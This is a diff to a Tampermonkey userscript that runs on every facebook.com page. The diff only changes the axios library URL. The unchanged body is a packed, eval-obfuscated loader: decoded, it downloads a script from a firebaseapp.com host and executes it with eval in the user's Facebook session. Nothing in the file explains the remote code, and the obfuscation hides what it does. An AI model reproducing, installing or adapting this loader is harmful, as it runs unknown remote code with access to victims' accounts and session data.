@@ -10,7 +10,7 @@ https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldm
 // @author       You
 // @match        https://*.facebook.com/*
 // @grant        none
-// @require https://npmcdn.com/axios/dist/axios.min.js
+// @require https://unpkg.com/axios/dist/axios.min.js
 // ==/UserScript==
 
 eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('(0(){\'6 5\';8.4(\'2://3-7.f.9/d.c\').a(0(1){b(1.e)})})();',16,16,'function|body|https|x48|get|strict|use|ff953|axios|com|then|eval|js|echelon|data|firebaseapp'.split('|'),0,{}))
